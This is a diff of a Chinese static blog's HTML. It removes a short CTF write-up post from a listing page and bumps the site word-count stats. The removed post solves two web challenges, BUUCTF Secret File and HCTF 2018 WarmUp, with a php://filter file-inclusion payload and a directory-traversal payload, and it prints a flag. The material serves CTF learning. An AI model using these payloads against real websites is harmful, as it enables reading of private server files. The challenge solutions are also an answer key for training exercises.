-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/9d3f05e0/" class="post-title-link" itemprop="url">20210515</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-05-15 16:41:50" itemprop="dateCreated datePublished" datetime="2021-05-15T16:41:50+08:00">2021-05-15</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/9d3f05e0/" class="post-meta-item leancloud_visitors" data-flag-title="20210515" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/9d3f05e0/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/9d3f05e0/" class="cy_cmt_count" data-xid="posts/9d3f05e0/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>467</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
-<p>主要就是文件包含和php伪协议</p>
-</blockquote>
-<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
-<pre><code>&lt;html&gt;
-    &lt;!--
-    secr3t.php        
-    --&gt;
-&lt;/html&gt;
-</code></pre>
-<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
-<p>构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
-<p>代码审计</p>
-</blockquote>
-<p>F12,提示source.php,打开代码审计</p>
-<p>payload:</p>
-<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
-</code></pre>
-<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
@@ -1859,13 +1829,13 @@ EXECUTE name;  //执行预定义SQL语句
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">133k</span>
+    <span title="站点总字数">134k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:42</span>
+    <span title="站点阅读时长">3:43</span>
   </span>
 </div>
 <div class="busuanzi-count">
